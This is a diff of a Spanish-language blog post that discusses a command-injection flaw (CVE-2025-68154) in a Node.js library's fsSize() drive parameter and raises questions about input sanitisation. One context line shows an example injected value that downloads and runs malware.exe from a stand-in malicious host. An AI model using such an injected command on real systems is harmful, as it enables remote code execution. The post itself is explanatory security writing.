@@ -1,5 +1,5 @@
 ---
-title: "¿Qué puede salir mal?"
+title: "¿Qué puede salir mal? (I)"
 author: "Patricio Moracho"
 date: 2025-12-18
 post_date: 2025-12-18
@@ -26,8 +26,6 @@ output:
   html_document:
     df_print: paged
 ---
-
-# ¿Qué puede salir mal? (I)
 
 Recién salido del horno, este [CVE] nos sirve para divagar un poco sobre la
 fragilidad de los sistemas de software y particularmente, sobre nosotros los
@@ -89,20 +87,34 @@ c: ;Download-File -Url http://malicious.site/malware.exe -OutFile
 C:\malware.exe ; Start-Process C:\malware.exe
 ```
 
-Creo que ya se entiende la idea.
+Creo que ya se entiende la idea. Llegamos a un lugar dónde fácilmente podemos
+ejecutar casi cualquier comando de forma remota, con los privilegios que tiene
+en este caso `Node.js` en el sistema operativo anfitrión, que como mínimo suelen
+ser algo más elevados.
 
-La moraleja fácil y rápida, sería: **nunca, pero nunca, confiar en la entrada del usuario**. Pero creo que hay mucha mas "tela para cortar" en este asunto.
+La moraleja fácil y rápida, sería: **nunca, pero nunca, confiar en la entrada
+del usuario**. Pero creo que hay mucha mas "tela para cortar" en este asunto.
 
 ## Algunas preguntas disruptivas
 
-* ¿Debería Sebastian Hildebrandt (autor de la librería) haber sanitizado el parámetro `drive`?
-* Soy del principio clasico de que una función haga bien solo un cosa, en lo posible de forma clara, concreta, eficiente y si se puede, elegante. ¿Por que debería preocuparme de problemas por fuera del alcance del requerimiento que busca resolver la función?
-* ¿Es correcto que una librería de software ejecute un shell command para averiguar una información puntual?
-* ¿Como desarrollador que consume esta librería, no debería haber sanitizado el parámetro `drive` antes de pasarlo a la función `fsSize()`?
-* ¿A los gritos invocamos el principio de minima responsabilidad de la función cuando se usa un shell command, pero no nos preocupa cuando exigimos a la función una sanitización de los parámetros de entrada?
-* ¿Deberíamos depender menos de librerías de terceros para funciones tan puntuales como esta?
+* ¿Debería Sebastian Hildebrandt (autor de la librería) haber sanitizado el
+  parámetro `drive`?
+* Soy del principio clasico de que una función haga bien solo un cosa, en lo
+  posible de forma clara, concreta, eficiente y si se puede, elegante. ¿Por que
+  debería preocuparme de problemas por fuera del alcance del requerimiento que
+  busca resolver la función?
+* ¿Es correcto que una librería de software ejecute un shell command para
+  averiguar una información puntual?
+* ¿Como desarrollador que consume esta librería, no debería haber sanitizado el
+  parámetro `drive` antes de pasarlo a la función `fsSize()`?
+* ¿A los gritos invocamos el principio de minima responsabilidad de la función
+  cuando se usa un shell command, pero no nos preocupa cuando exigimos a la
+  función una sanitización de los parámetros de entrada?
+* ¿Deberíamos depender menos de librerías de terceros para funciones tan
+  puntuales como esta?
 
-Mas adelante, buscaré responderme estas preguntas y otras que surjan en el camino.
+Mas adelante, buscaré responderme estas preguntas y otras que surjan en el
+camino.
 
 
 [CVE]: https://nvd.nist.gov/vuln/detail/CVE-2025-68154
